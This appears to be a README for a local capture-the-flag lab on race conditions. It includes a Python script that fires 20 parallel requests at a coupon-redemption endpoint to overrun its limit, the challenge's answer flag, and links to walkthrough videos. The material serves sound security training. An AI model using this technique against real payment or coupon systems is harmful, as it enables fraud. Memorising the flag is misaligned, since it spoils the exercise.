# Race Conditions & Concurrency Attacks Lab

## Overview
Practice exploiting Limit Overrun / TOCTOU (Time-of-Check to Time-of-Use) race conditions using Burp Suite Turbo Intruder or parallel asynchronous HTTP requests (PortSwigger Web Security Academy topic 27).

- **Default Port / Access**: `http://localhost:8097`
- **Shortcut**: `./lab start race-condition`

---

## Exploitation Workflow

1. **Observe Normal Logic**:
   Redeeming a coupon normally increments the counter to `1/1` and adds `$100`. Any subsequent click returns `400 Coupon already used`.

2. **Turbo Intruder / Parallel HTTP/2 Race Attack**:
   Reset the balance and send 20–30 simultaneous requests into the race window.

   *Example Python Race Script*:
   ```python
   import threading
   import requests

   def redeem():
       r = requests.post("http://localhost:8097/redeem")
       if "FLAG" in r.text:
           print("[+] RACE WON:", r.text)

   threads = [threading.Thread(target=redeem) for _ in range(20)]
   for t in threads: t.start()
   for t in threads: t.join()
   ```

3. **Verify Limit Overrun**:
   If requests land within the concurrency window, `coupons_used` will exceed 1 and the challenge will yield `FLAG{TURBO_INTRUDER_RACE_PWNED}`.

---

## YouTube Walkthroughs & Solving Guides
- [Pink Boo - Limit Overrun Race Conditions (PortSwigger Academy)](https://www.youtube.com/watch?v=-2_EUSTcfx4)
- [Michael Sommer - Race Conditions: Bypassing Rate Limits with Turbo Intruder](https://www.youtube.com/watch?v=IRzeBWy76NA)
- [Infinite Logins - Limit Overrun Race Conditions Lab (PortSwigger)](https://www.youtube.com/watch?v=Zp04Gn7lsIU)
